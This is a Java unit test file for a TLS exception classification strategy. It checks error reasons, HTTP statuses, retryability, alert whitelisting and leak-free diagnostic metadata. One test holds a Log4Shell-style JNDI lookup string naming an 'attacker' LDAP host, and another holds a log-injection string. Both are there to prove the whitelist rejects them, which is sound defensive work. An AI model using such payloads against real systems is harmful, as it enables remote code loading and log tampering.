package space.br1440.platform.errorhandling.core.strategy.cause.network;

import io.netty.handler.ssl.NotSslRecordException;
import io.netty.handler.ssl.SslClosedEngineException;
import io.netty.handler.ssl.SslHandshakeTimeoutException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.http.HttpStatus;
import space.br1440.platform.errorhandling.core.util.StackHintExtractor;
import space.br1440.platform.errorhandling.extension.Retryability;
import space.br1440.platform.errorhandling.extension.RootCauseResolution;
import space.br1440.platform.errorhandling.model.error_detail.ErrorInfoDetail;

import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import javax.net.ssl.SSLKeyException;
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.net.ssl.SSLProtocolException;
import javax.security.auth.x500.X500Principal;
import java.math.BigInteger;
import java.security.PublicKey;
import java.security.cert.CertPath;
import java.security.cert.CertPathBuilderException;
import java.security.cert.CertPathValidatorException;
import java.security.cert.Certificate;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateExpiredException;
import java.security.cert.CertificateNotYetValidException;
import java.security.cert.X509Certificate;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit-тесты для {@link SslExceptionStrategy}.
 *
 * <p>Покрытие:
 * <ul>
 *   <li>Классификация всех {@code SslErrorType}: JDK + Netty (по classpath).</li>
 *   <li>HTTP-статус, retryability и domain="tls".</li>
 *   <li>TLS alert direction (inbound/outbound) и whitelist (RFC 5246/8446).</li>
 *   <li>{@code certificate_required} → {@code MTLS_CLIENT_CERT_REQUIRED} (RFC 8446 §6.2).</li>
 *   <li>{@code peer not authenticated} → {@code MTLS_PEER_NOT_AUTHENTICATED}.</li>
 *   <li>X.509 структурные поля (notBefore/notAfter epoch, sigAlgName).</li>
 *   <li>Security-инварианты CWE-209/CWE-200 (нет message, нет CN/SAN/Subject).</li>
 *   <li>Reason-driven {@code CertPathValidatorException} ветви: REVOKED, UNDETERMINED_REVOCATION_STATUS.</li>
 * </ul>
 */
@DisplayName("SslExceptionStrategy")
class SslExceptionStrategyTest {

    private SslExceptionStrategy strategy;

    @BeforeEach
    void setUp() {
        strategy = new SslExceptionStrategy(new StackHintExtractor(false, List.of()));
    }

    @Nested
    @DisplayName("supportsCause")
    class SupportsCause {

        @ParameterizedTest(name = "{0}")
        @MethodSource("supportedExceptions")
        void acceptsSupportedTypes(String label, Throwable cause) {
            assertThat(strategy.supportsCause(cause)).isTrue();
        }

        static Stream<Arguments> supportedExceptions() {
            return Stream.of(
                    Arguments.of("SSLHandshakeException", new SSLHandshakeException("handshake")),
                    Arguments.of("SSLKeyException", new SSLKeyException("key")),
                    Arguments.of("SSLPeerUnverifiedException", new SSLPeerUnverifiedException("peer")),
                    Arguments.of("SSLProtocolException", new SSLProtocolException("protocol")),
                    Arguments.of("SSLException (generic)", new SSLException("generic")),
                    Arguments.of("CertificateException", new CertificateException("cert")),
                    Arguments.of("CertificateExpiredException", new CertificateExpiredException("expired")),
                    Arguments.of("CertificateNotYetValidException", new CertificateNotYetValidException("not yet valid")),
                    Arguments.of("CertPathBuilderException", new CertPathBuilderException("build")),
                    Arguments.of("CertPathValidatorException", new CertPathValidatorException("validate")),
                    Arguments.of("NotSslRecordException", new NotSslRecordException("not ssl record")),
                    Arguments.of("SslHandshakeTimeoutException",
                            new SslHandshakeTimeoutException("handshake timed out")),
                    Arguments.of("SslClosedEngineException", new SslClosedEngineException("engine closed"))
            );
        }

        @Test
        void rejectsNonTlsExceptions() {
            assertThat(strategy.supportsCause(new RuntimeException("not tls"))).isFalse();
            assertThat(strategy.supportsCause(new IllegalStateException("nope"))).isFalse();
        }
    }

    @Nested
    @DisplayName("classification — гранулярные категории")
    class Classification {

        @ParameterizedTest(name = "{0} → reason={1} status={2} retryable={3}")
        @MethodSource("classificationCases")
        void classifiesCorrectly(String label,
                                 String expectedReason,
                                 HttpStatus expectedStatus,
                                 Retryability expectedRetryability,
                                 Throwable cause) {
            RootCauseResolution resolution = strategy.extractCauseDetails(cause);

            assertThat(extractReason(resolution)).isEqualTo(expectedReason);
            assertThat(resolution.httpStatus()).isEqualTo(expectedStatus);
            assertThat(resolution.retryability()).isEqualTo(expectedRetryability);
        }

        static Stream<Arguments> classificationCases() {
            return Stream.of(
                    Arguments.of("SSLHandshakeException → HANDSHAKE_FAILURE",
                            "HANDSHAKE_FAILURE", HttpStatus.SERVICE_UNAVAILABLE, Retryability.UNSPECIFIED,
                            new SSLHandshakeException("Remote host terminated the handshake")),

                    Arguments.of("SSLProtocolException → PROTOCOL_ERROR",
                            "PROTOCOL_ERROR", HttpStatus.SERVICE_UNAVAILABLE, Retryability.UNSPECIFIED,
                            new SSLProtocolException("protocol_version mismatch")),

                    Arguments.of("SSLKeyException → LOCAL_KEY_ERROR (500)",
                            "LOCAL_KEY_ERROR", HttpStatus.INTERNAL_SERVER_ERROR, Retryability.NOT_RETRYABLE,
                            new SSLKeyException("bad key in our keystore")),

                    Arguments.of("SSLPeerUnverifiedException → PEER_UNVERIFIED",
                            "PEER_UNVERIFIED", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new SSLPeerUnverifiedException("hostname mismatch")),

                    Arguments.of("SSLPeerUnverifiedException 'peer not authenticated' → MTLS_PEER_NOT_AUTHENTICATED",
                            "MTLS_PEER_NOT_AUTHENTICATED", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new SSLPeerUnverifiedException("peer not authenticated")),

                    Arguments.of("SSLException (generic) → GENERIC_SSL",
                            "GENERIC_SSL", HttpStatus.SERVICE_UNAVAILABLE, Retryability.UNSPECIFIED,
                            new SSLException("something went wrong")),

                    Arguments.of("CertificateExpiredException → CERT_EXPIRED",
                            "CERT_EXPIRED", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new CertificateExpiredException("NotAfter: Mon Jan 01 00:00:00 UTC 2020")),

                    Arguments.of("CertificateNotYetValidException → CERT_NOT_YET_VALID",
                            "CERT_NOT_YET_VALID", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new CertificateNotYetValidException("NotBefore: Mon Jan 01 00:00:00 UTC 2099")),

                    Arguments.of("CertPathBuilderException → CERT_PATH_BUILD_FAILED",
                            "CERT_PATH_BUILD_FAILED", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new CertPathBuilderException("unable to build")),

                    Arguments.of("CertPathValidatorException (no reason) → CERT_PATH_VALIDATION_FAILED",
                            "CERT_PATH_VALIDATION_FAILED", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new CertPathValidatorException("validation failure")),

                    Arguments.of("CertificateException → CERT_INVALID",
                            "CERT_INVALID", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new CertificateException("malformed")),

                    Arguments.of("NotSslRecordException → NETTY_NOT_SSL_RECORD",
                            "NETTY_NOT_SSL_RECORD", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new NotSslRecordException("plaintext on TLS port")),

                    Arguments.of("SslHandshakeTimeoutException → NETTY_HANDSHAKE_TIMEOUT (504)",
                            "NETTY_HANDSHAKE_TIMEOUT", HttpStatus.GATEWAY_TIMEOUT, Retryability.NOT_RETRYABLE,
                            new SslHandshakeTimeoutException("handshake timed out")),

                    Arguments.of("SslClosedEngineException → NETTY_CLOSED_ENGINE",
                            "NETTY_CLOSED_ENGINE", HttpStatus.SERVICE_UNAVAILABLE, Retryability.NOT_RETRYABLE,
                            new SslClosedEngineException("engine closed"))
            );
        }
    }

    @Nested
    @DisplayName("ErrorInfoDetail — domain/reason")
    class DomainAndReason {

        @Test
        @DisplayName("domain = \"tls\" для всех SSL-ошибок")
        void domainIsAlwaysTls() {
            for (Throwable cause : List.<Throwable>of(
                    new SSLHandshakeException("h"),
                    new SSLPeerUnverifiedException("p"),
                    new CertPathValidatorException("v"),
                    new NotSslRecordException("n"))) {
                ErrorInfoDetail info = extractInfo(strategy.extractCauseDetails(cause));
                assertThat(info.getDomain()).as("domain").isEqualTo("tls");
            }
        }
    }

    @Nested
    @DisplayName("TLS alert extraction")
    class TlsAlertExtraction {

        @Test
        void extractsInboundAlert_certificateExpired() {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Received fatal alert: certificate_expired");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("tlsAlertDescription", "certificate_expired");
            assertThat(meta).containsEntry("tlsAlertDirection", "inbound");
        }

        @Test
        void extractsOutboundAlert_badCertificate() {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Sending fatal alert: bad_certificate");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("tlsAlertDescription", "bad_certificate");
            assertThat(meta).containsEntry("tlsAlertDirection", "outbound");
        }

        @ParameterizedTest(name = "TLS 1.3 alert {0} попадает в whitelist")
        @MethodSource("tls13AlertNames")
        void allowsTls13Alerts(String alertName) {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Received fatal alert: " + alertName);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("tlsAlertDescription", alertName);
        }

        static Stream<String> tls13AlertNames() {
            return Stream.of(
                    "missing_extension",
                    "unrecognized_name",
                    "bad_certificate_status_response",
                    "bad_certificate_hash_value",
                    "unknown_psk_identity",
                    "no_application_protocol",
                    "inappropriate_fallback"
            );
        }

        @Test
        void rejectsUnknownAlert_notInWhitelist() {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Received fatal alert: rogue_alert_name_${jndi:ldap://attacker}");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).doesNotContainKey("tlsAlertDescription");
            assertThat(meta).doesNotContainKey("tlsAlertDirection");
        }

        @Test
        void noAlertInfo_whenMessageIsNull() {
            SSLHandshakeException ex = new SSLHandshakeException(null);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).doesNotContainKey("tlsAlertDescription");
        }
    }

    // ── certificate_required → MTLS_CLIENT_CERT_REQUIRED ─────────────────────────

    @Nested
    @DisplayName("MTLS_CLIENT_CERT_REQUIRED")
    class MtlsClientCertRequired {

        @Test
        void inboundCertificateRequired_classifiedAsMtlsClientCertRequired() {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Received fatal alert: certificate_required");

            RootCauseResolution resolution = strategy.extractCauseDetails(ex);

            assertThat(extractReason(resolution)).isEqualTo("MTLS_CLIENT_CERT_REQUIRED");
            assertThat(resolution.httpStatus()).isEqualTo(HttpStatus.UNAUTHORIZED);
            assertThat(resolution.retryability()).isEqualTo(Retryability.NOT_RETRYABLE);
        }
    }

    // ── CertPathValidatorException Reason ────────────────────────────────────────

    @Nested
    @DisplayName("CertPathValidatorException — reason-driven")
    class CertPathReason {

        @Test
        void revokedReason_classifiedAsCertRevoked() {
            CertPathValidatorException ex = new CertPathValidatorException(
                    "revoked", null, null, -1,
                    CertPathValidatorException.BasicReason.REVOKED);

            RootCauseResolution resolution = strategy.extractCauseDetails(ex);

            assertThat(extractReason(resolution)).isEqualTo("CERT_REVOKED");
            assertThat(resolution.retryability()).isEqualTo(Retryability.NOT_RETRYABLE);

            Map<String, String> meta = extractMetadata(resolution);
            assertThat(meta).containsEntry("certPathValidationReason", "REVOKED");
        }

        @Test
        void undeterminedRevocationStatus_classifiedAsCertRevocationUnknown_andNotRetryable() {
            CertPathValidatorException ex = new CertPathValidatorException(
                    "ocsp unreachable", null, null, -1,
                    CertPathValidatorException.BasicReason.UNDETERMINED_REVOCATION_STATUS);

            RootCauseResolution resolution = strategy.extractCauseDetails(ex);

            assertThat(extractReason(resolution)).isEqualTo("CERT_REVOCATION_UNKNOWN");
            // Политика: UNDETERMINED_REVOCATION_STATUS не делаем RETRYABLE — иначе маскируем PKI-проблемы.
            assertThat(resolution.retryability()).isEqualTo(Retryability.NOT_RETRYABLE);
        }

        @Test
        void unspecifiedReason_fallbackToValidationFailed() {
            CertPathValidatorException ex = new CertPathValidatorException(
                    "unspecified", null, null, -1,
                    CertPathValidatorException.BasicReason.UNSPECIFIED);

            RootCauseResolution resolution = strategy.extractCauseDetails(ex);

            assertThat(extractReason(resolution)).isEqualTo("CERT_PATH_VALIDATION_FAILED");
        }
    }

    // ── X509 — структурные поля сертификата ──────────────────────────────────────

    @Nested
    @DisplayName("X.509 — структурные поля при наличии CertPath[index]")
    class X509Details {

        @Test
        void notBeforeNotAfterAndSigAlgExtracted_whenIndexInRange() throws Exception {
            // 2025-01-01T00:00:00Z и 2026-01-01T00:00:00Z в epoch seconds.
            long notBeforeEpoch = 1735689600L;
            long notAfterEpoch = 1767225600L;

            X509Certificate cert = stubX509Certificate(
                    Date.from(java.time.Instant.ofEpochSecond(notBeforeEpoch)),
                    Date.from(java.time.Instant.ofEpochSecond(notAfterEpoch)),
                    "SHA256withRSA");

            CertPath certPath = stubCertPath(List.of(cert));
            CertPathValidatorException ex = new CertPathValidatorException(
                    "expired", null, certPath, 0,
                    CertPathValidatorException.BasicReason.EXPIRED);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("certNotBeforeEpochSec", String.valueOf(notBeforeEpoch));
            assertThat(meta).containsEntry("certNotAfterEpochSec", String.valueOf(notAfterEpoch));
            assertThat(meta).containsEntry("certSigAlgName", "SHA256withRSA");
            assertThat(meta).containsEntry("certPathIndex", "0");
            assertThat(meta).containsEntry("certChainDepth", "1");
            assertThat(meta).containsEntry("certPathType", "X.509");
        }

        @Test
        @DisplayName("X.509 details не извлекаются, когда index = -1 (не определён)")
        void noX509Details_whenIndexUndefined() {
            X509Certificate cert = stubX509Certificate(new Date(), new Date(), "SHA256withRSA");
            CertPath certPath = stubCertPath(List.of(cert));

            // index = -1 — JDK-конвенция «индекс не определён» (см. CertPathValidatorException javadoc).
            // BasicReason.UNSPECIFIED обязателен — JDK-конструктор требует non-null reason.
            CertPathValidatorException ex = new CertPathValidatorException(
                    "undefined index", null, certPath, -1,
                    CertPathValidatorException.BasicReason.UNSPECIFIED);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            // Структура цепочки доступна — извлекаем chain depth / type.
            assertThat(meta).containsEntry("certChainDepth", "1");
            assertThat(meta).containsEntry("certPathType", "X.509");
            // Конкретный сертификат недоступен — X.509 детали отсутствуют.
            assertThat(meta).doesNotContainKey("certNotBeforeEpochSec");
            assertThat(meta).doesNotContainKey("certNotAfterEpochSec");
            assertThat(meta).doesNotContainKey("certSigAlgName");
            assertThat(meta).doesNotContainKey("certPathIndex");
        }

        @Test
        @DisplayName("X.509 details не извлекаются, когда certPath = null")
        void noX509Details_whenCertPathIsNull() {
            // BasicReason.UNSPECIFIED обязателен — JDK-конструктор требует non-null reason.
            CertPathValidatorException ex = new CertPathValidatorException(
                    "no path", null, null, -1,
                    CertPathValidatorException.BasicReason.UNSPECIFIED);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).doesNotContainKey("certNotBeforeEpochSec");
            assertThat(meta).doesNotContainKey("certNotAfterEpochSec");
            assertThat(meta).doesNotContainKey("certSigAlgName");
            assertThat(meta).doesNotContainKey("certChainDepth");
            assertThat(meta).doesNotContainKey("certPathType");
        }
    }

    // ── Security invariants (CWE-209/CWE-200) ────────────────────────────────────

    @Nested
    @DisplayName("CWE-209/CWE-200 — secure metadata")
    class SecurityInvariants {

        @Test
        @DisplayName("rootCauseMessage не попадает в metadata (CWE-209)")
        void rootCauseMessageNeverInMetadata() {
            // chain: SSLHandshakeException(generic) → cause(CertificateException with sensitive)
            CertificateException sensitive = new CertificateException(
                    "subject=CN=secret-internal-host.bank.local, serial=0x1234567890ABCDEF");
            SSLHandshakeException wrapper = new SSLHandshakeException("handshake_failure");
            wrapper.initCause(sensitive);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(wrapper));

            // rootCauseClass — структурный, ОК
            assertThat(meta).containsKey("rootCauseClass");
            assertThat(meta).doesNotContainKey("rootCauseMessage");
            assertThat(meta).doesNotContainKey("causeMessage");
            assertThat(meta.values().stream()
                    .noneMatch(v -> v.contains("secret-internal-host.bank.local")))
                    .as("CN/SAN не должны попадать в metadata через root-cause message").isTrue();
            assertThat(meta.values().stream()
                    .noneMatch(v -> v.contains("0x1234567890ABCDEF")))
                    .as("serial не должен попадать в metadata").isTrue();
        }

        @Test
        @DisplayName("alert whitelist отбрасывает произвольные токены из подменённого message")
        void alertWhitelistBlocksInjectionAttempts() {
            SSLHandshakeException ex = new SSLHandshakeException(
                    "Received fatal alert: __INJECTED__\n[ERROR] log injection attempt");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).doesNotContainKey("tlsAlertDescription");
            assertThat(meta.values().stream().noneMatch(v -> v.contains("__INJECTED__")))
                    .as("rogue alert не должен попадать в metadata").isTrue();
        }

        @Test
        @DisplayName("PEER_UNVERIFIED — message с peer hostname не попадает в metadata")
        void peerUnverifiedMessageNotLeaked() {
            SSLPeerUnverifiedException ex =
                    new SSLPeerUnverifiedException("No name matching upstream-secret-host found");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta.values().stream()
                    .noneMatch(v -> v.contains("upstream-secret-host")))
                    .as("hostname из message не должен попадать в metadata").isTrue();
        }

        @Test
        @DisplayName("X.509 структурные поля не включают Subject/Issuer DN, serial, public key")
        void x509Details_excludeIdentityFields() throws Exception {
            X509Certificate cert = stubX509Certificate(new Date(), new Date(), "SHA256withRSA");
            CertPath certPath = stubCertPath(List.of(cert));

            CertPathValidatorException ex = new CertPathValidatorException(
                    "expired", null, certPath, 0,
                    CertPathValidatorException.BasicReason.EXPIRED);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            // Положительные: только безопасные структурные поля.
            assertThat(meta).containsKeys("certSigAlgName");
            // Отрицательные: identity-поля сертификата.
            assertThat(meta).doesNotContainKey("certSubjectDn");
            assertThat(meta).doesNotContainKey("certIssuerDn");
            assertThat(meta).doesNotContainKey("certSerialNumber");
            assertThat(meta).doesNotContainKey("certPublicKey");
            assertThat(meta).doesNotContainKey("cipherSuite");
        }
    }

    // ── tlsVersion extraction ────────────────────────────────────────────────────

    @Nested
    @DisplayName("tlsVersion extraction")
    class TlsVersionExtraction {

        @Test
        void extractsTLSv12_fromMessage() {
            SSLProtocolException ex = new SSLProtocolException("TLSv1.2 handshake failed");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("tlsVersion", "TLSv1.2");
        }

        @Test
        void extractsTLSv13_fromMessage() {
            SSLProtocolException ex = new SSLProtocolException(
                    "TLSv1.3 cipher negotiation failure");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("tlsVersion", "TLSv1.3");
        }

        @Test
        void noTlsVersion_whenMessageHasNoVersion() {
            SSLException ex = new SSLException("generic ssl error");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).doesNotContainKey("tlsVersion");
        }
    }

    // ── certValidityDetail (legacy detail) ───────────────────────────────────────

    @Nested
    @DisplayName("certValidityDetail (legacy detail)")
    class CertValidityDetail {

        @Test
        void extractsValidityDetail_forExpiredException() {
            CertificateExpiredException ex = new CertificateExpiredException(
                    "NotAfter: Wed Jan 01 00:00:00 UTC 2020");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsKey("certValidityDetail");
            assertThat(meta.get("certValidityDetail")).contains("NotAfter");
        }

        @Test
        void truncatesLongValidityDetail_to100chars() {
            String longMsg = "NotAfter: " + "x".repeat(500);
            CertificateExpiredException ex = new CertificateExpiredException(longMsg);

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta.get("certValidityDetail")).hasSizeLessThanOrEqualTo(120); // +marker
        }
    }

    // ── exceptionClass + sslErrorType ────────────────────────────────────────────

    @Nested
    @DisplayName("diagnosticMetadata structure")
    class MetadataStructure {

        @Test
        void containsExceptionClassAndSslErrorType() {
            SSLHandshakeException ex = new SSLHandshakeException("handshake");

            Map<String, String> meta = extractMetadata(strategy.extractCauseDetails(ex));

            assertThat(meta).containsEntry("exceptionClass", SSLHandshakeException.class.getName());
            assertThat(meta).containsEntry("sslErrorType", "HANDSHAKE_FAILURE");
        }
    }

    // ── helpers ──────────────────────────────────────────────────────────────────

    private static String extractReason(RootCauseResolution resolution) {
        return resolution.details().stream()
                .filter(ErrorInfoDetail.class::isInstance)
                .map(ErrorInfoDetail.class::cast)
                .map(ErrorInfoDetail::getReason)
                .findFirst()
                .orElseThrow(() -> new AssertionError("RootCauseResolution не содержит ErrorInfoDetail"));
    }

    private static ErrorInfoDetail extractInfo(RootCauseResolution resolution) {
        return resolution.details().stream()
                .filter(ErrorInfoDetail.class::isInstance)
                .map(ErrorInfoDetail.class::cast)
                .findFirst()
                .orElseThrow(() -> new AssertionError("RootCauseResolution не содержит ErrorInfoDetail"));
    }

    private static Map<String, String> extractMetadata(RootCauseResolution resolution) {
        return extractInfo(resolution).getDiagnosticMetadata();
    }

    /**
     * Строит {@link CertPath} c заданным списком сертификатов и type=X.509,
     * без зависимости от реальных PEM/DER-файлов в тестах.
     */
    private static CertPath stubCertPath(List<? extends Certificate> certs) {
        return new CertPath("X.509") {
            @Override
            public List<? extends Certificate> getCertificates() {
                return certs;
            }

            @Override
            public byte[] getEncoded() {
                return new byte[0];
            }

            @Override
            public byte[] getEncoded(String encoding) {
                return new byte[0];
            }

            @Override
            public java.util.Iterator<String> getEncodings() {
                return Set.of("PkiPath").iterator();
            }
        };
    }

    /**
     * Минимальный stub {@link X509Certificate} — заполняет только поля, читаемые стратегией:
     * notBefore/notAfter/sigAlgName. Остальные методы — defensive defaults.
     */
    private static X509Certificate stubX509Certificate(Date notBefore, Date notAfter, String sigAlgName) {
        return new X509Certificate() {
            @Override public void checkValidity() { }
            @Override public void checkValidity(Date date) { }
            @Override public int getVersion() { return 3; }
            @Override public BigInteger getSerialNumber() { return BigInteger.ONE; }
            @Override public java.security.Principal getIssuerDN() { return new X500Principal("CN=test-ca"); }
            @Override public java.security.Principal getSubjectDN() { return new X500Principal("CN=test"); }
            @Override public Date getNotBefore() { return notBefore; }
            @Override public Date getNotAfter() { return notAfter; }
            @Override public byte[] getTBSCertificate() { return new byte[0]; }
            @Override public byte[] getSignature() { return new byte[0]; }
            @Override public String getSigAlgName() { return sigAlgName; }
            @Override public String getSigAlgOID() { return "1.2.840.113549.1.1.11"; }
            @Override public byte[] getSigAlgParams() { return new byte[0]; }
            @Override public boolean[] getIssuerUniqueID() { return new boolean[0]; }
            @Override public boolean[] getSubjectUniqueID() { return new boolean[0]; }
            @Override public boolean[] getKeyUsage() { return new boolean[0]; }
            @Override public int getBasicConstraints() { return -1; }
            @Override public byte[] getEncoded() throws CertificateEncodingException {
                throw new CertificateEncodingException("stub");
            }
            @Override public void verify(PublicKey key) { }
            @Override public void verify(PublicKey key, String sigProvider) { }
            @Override public String toString() { return "stub"; }
            @Override public PublicKey getPublicKey() { return null; }
            @Override public boolean hasUnsupportedCriticalExtension() { return false; }
            @Override public Set<String> getCriticalExtensionOIDs() { return Set.of(); }
            @Override public Set<String> getNonCriticalExtensionOIDs() { return Set.of(); }
            @Override public byte[] getExtensionValue(String oid) { return new byte[0]; }
        };
    }
}
